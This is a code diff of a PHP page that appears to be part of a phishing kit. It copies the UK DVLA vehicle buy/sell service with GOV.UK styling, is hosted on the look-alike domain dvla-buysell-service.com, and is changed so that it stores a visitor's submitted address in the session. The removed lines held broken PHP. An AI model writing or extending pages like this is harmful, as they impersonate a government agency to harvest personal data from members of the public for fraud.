@@ -1,15 +1,11 @@
 <?php
 session_start();
 
+$_SESSION['address'] = $_POST['address'];
 
-if (isset('$_POST'['dateofsale'])) {
-    $_SESSION['dateofsale_day'] = $_POST['dateofsale_day'];
-    $_SESSION['dateofsale_month'] = $_POST['dateofsale_month'];
-    $_SESSION['dateofsale_year'] = $_POST['dateofsale_year'];
-    $_SESSION['mileage'] = $_POST['mileage'];
+$address = $_SESSION['address'];
 
-    var_dump($_SESSION); // Debug: Check session variables
-}
+
 ?>
 
 <!-- saved from url=(0085)https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/saledate.php -->
@@ -111,7 +107,7 @@ if (isset('$_POST'['dateofsale'])) {
             <a class="govuk-back-link" id="back"
                href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/saledate.php#">Back</a>
             <script>
-               document.getElementById('back').addEventListener('click', function () {
+               document.getElementById('back').addEventListener('click', function() {
                   history.back();
                });
             </script>
@@ -166,7 +162,7 @@ if (isset('$_POST'['dateofsale'])) {
                                                 onkeypress="check(event, this, /[0-9]/);" no_optional_label="true"
                                                 class="govuk-input govuk-date-input__input govuk-input--width-4"
                                                 autocomplete="off" maxlength="4">
-                                                <input type="hidden" name="dateofsale"/>
+                                             <input type="hidden" name="dateofsale" />
                                           </div>
                                        </div>
                                     </div>
